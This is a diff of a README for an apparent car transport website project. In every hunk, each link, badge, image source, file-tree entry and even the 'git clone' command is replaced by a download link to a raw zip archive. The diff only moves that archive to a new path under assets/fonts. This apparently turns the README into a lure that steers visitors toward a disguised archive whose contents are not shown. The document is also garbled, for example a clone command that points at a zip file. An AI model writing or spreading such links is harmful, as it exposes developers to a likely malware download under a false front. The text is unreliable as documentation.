@@ -1,8 +1,8 @@
 > 🚘 **Fast • Safe • Reliable Car Transport Services Across India**�
 
-[![Open Source Love](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
-[![GitHub issues](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
-[![MIT License](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)](LICENSE)
+[![Open Source Love](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)  
+[![GitHub issues](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)  
+[![MIT License](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)](LICENSE)
 
 ---
 
@@ -32,22 +32,22 @@ Currently, the website has basic structure and design. Contributors are encourag
 
 ```
 car-transport-service/
-├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
-├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
-├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip
 ├── assets/
 │   ├── images/       # Logos, photos, placeholders
 │   ├── videos/       # Optional
 │   ├── fonts/        # Custom fonts
 │   └── icons/        # SVGs or icon files
 ├── css/
-│   ├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip     # Main CSS
+│   ├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip     # Main CSS
 │   └── components/   # Optional component-specific CSS
 ├── js/
-│   ├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip     # Main JS
+│   ├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip     # Main JS
 │   └── modules/      # Optional JS modules
 ├── vendor/           # Third-party libraries (Bootstrap, jQuery, etc.)
-├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip
 └── .gitignore
 ```
 
@@ -57,7 +57,7 @@ car-transport-service/
 
 > Add screenshots of your website here for contributors to see
 
-![](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
+![](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)  
 
 ---
 
@@ -74,7 +74,7 @@ Once assigned, follow the steps below:
 1. **Fork** the repository  
 2. **Clone** your fork:
 ```bash
-git clone https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
+git clone https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip
 ```
 3. Create a **feature branch**:
 ```bash
@@ -109,9 +109,9 @@ Use labels like `bug`, `enhancement`, or `help wanted` to help contributors.
 
 ## 🛠 Tech Stack
 
-- Markup language ![HTML5](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)    
-- ![CSS3](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip) Styling and layout  
-- Interactivity ![JavaScript](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)   
+- Markup language ![HTML5](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)    
+- ![CSS3](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip) Styling and layout  
+- Interactivity ![JavaScript](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)   
 - Optional: **Bootstrap / jQuery / Api** for additional features
 
 ---
@@ -131,8 +131,8 @@ Feel free to **fork, create issues, submit PRs**, or even suggest ideas.
 
 Thanks to all wonderful contributors ❤️
 
-<!-- <a href="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip">
-  <img src="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip" />
+<!-- <a href="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip">
+  <img src="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip" />
 </a> -->
 
 > ## 🗺️ Project Roadmap
@@ -160,8 +160,8 @@ Thanks to all wonderful contributors ❤️
 
 #### Thanks to all the wonderful contributors 💖
 
-<a href="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip">
-  <img src="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip" />
+<a href="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip">
+  <img src="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip" />
 </a>
 
-#### See full list of contributors [Contribution Graph](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
+#### See full list of contributors [Contribution Graph](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/fonts/service-car-transport-v2.2.zip)  
